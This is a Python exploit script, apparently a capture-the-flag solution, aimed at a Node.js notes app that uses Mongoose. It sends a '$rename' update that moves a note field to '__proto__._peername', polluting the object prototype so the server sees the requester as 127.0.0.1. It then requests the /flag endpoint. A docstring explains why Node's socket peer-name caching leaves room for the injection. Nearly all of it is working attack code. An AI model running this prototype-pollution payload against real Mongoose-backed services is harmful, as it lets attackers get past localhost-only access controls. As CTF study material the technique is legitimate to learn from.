import requests
import json
import sys


if "LOCAL" in sys.argv:
    BASE_URL = "http://localhost:1337"
else:
    BASE_URL = "http://154.57.164.72:31578"


# Useful resources:
#   https://security.snyk.io/vuln/SNYK-JS-MONGOOSE-5777721
#   https://github.com/nodejs/node/blob/main/lib/net.js

def solve():
    # Create a legitimate note first to get a valid noteId
    print("[*] Creating a dummy note...")
    r = requests.post(f"{BASE_URL}/create", json={
        "title": "PWNED",
        "content": "127.0.0.1",
    })
    
    if r.status_code != 200:
        print("[-] Failed to create note.")
        return

    note_id = r.json().get("_id")
    print(f"[+] Created note with ID: {note_id}")

    r = requests.get(f"{BASE_URL}/get/{note_id}")
    print(f"[*] Get note: {r.text}")


    """
        ```
            Socket.prototype._getpeername = function() {
                if (!this._handle || !this._handle.getpeername || this.connecting) {
                    return this._peername || {};
                } else if (!this._peername) {
                    const out = {};
                    const err = this._handle.getpeername(out);
                    if (err) return out;
                    this._peername = out;
                }
                return this._peername;
            };
        ```

    Normally, NodeJS calls the `getpeername()` to ask the OS for the actual IP of the connected client.
    It then stores that result in `this._peername` so it doesn't have to ask the OS again (caching).

    After executing $rename to __proto__._peername, we are putting the string "127.0.0.1" onto the
    global Object.prototype.

    Because the code uses `this._peername || {}`, the JavaScript engine performs a lookup:
        - Does the specific socket instance have _peername? (No, it's a new connection)
        - Does the Socket prototype have _peername? (No)
        - Does the Object prototype have _peername? (YES! It finds our polluted object)

    The property `_peername` is intended to be a simple data object.
    NodeJS expects it to be missing on new sockets, creating a perfect "hole" for Prototype Pollution to fill.
    """

    print("[*] Attempting to pollute prototype...")

    payload = {
        "noteId": note_id,
        "$rename": {
            "content": "__proto__._peername"
        }
    }

    update_req = requests.post(f"{BASE_URL}/update", json=payload)
    print(f"[*] Update response: {update_req.text}")

    r = requests.get(f"{BASE_URL}/get/{note_id}")
    print(f"[*] Get note: {r.text}")

    flag_req = requests.get(f"{BASE_URL}/flag")
    if flag_req.status_code == 200:
        print(f"[+] Success! Flag: {flag_req.text}")
    else:
        print(f"[-] Failed to get flag. Status: {flag_req.status_code}")
        print(f"[-] Response: {flag_req.text}")

if __name__ == "__main__":
    solve()
